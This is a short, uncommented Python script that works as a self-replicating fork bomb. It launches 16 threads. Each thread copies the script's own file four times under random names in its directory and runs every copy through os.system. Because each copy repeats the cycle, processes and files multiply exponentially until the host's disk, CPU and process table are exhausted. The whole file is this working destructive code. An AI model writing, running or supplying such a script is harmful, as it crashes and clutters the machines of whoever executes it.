import os
import inspect
from shutil import *
from random import *
import threading
var = 0
class MyThread(threading.Thread):
	def run(self):
		global var
		var += 1
		for i in range(0,4):
			name1 = str(randint(1,1000000000000000))
			newFile = "%s.py" % name1
			dir1 = str(inspect.getfile(inspect.currentframe()))
			dir2 = str(os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe()))))
			copy("%s" % (dir1), "%s/%s" % (dir2, newFile))
			newDirec = "%s/%s" % (dir2, newFile)
			cmd = "python %s" % newDirec
			os.system(cmd)
for i in range(0,16):
	MyThread().start()
	i += 1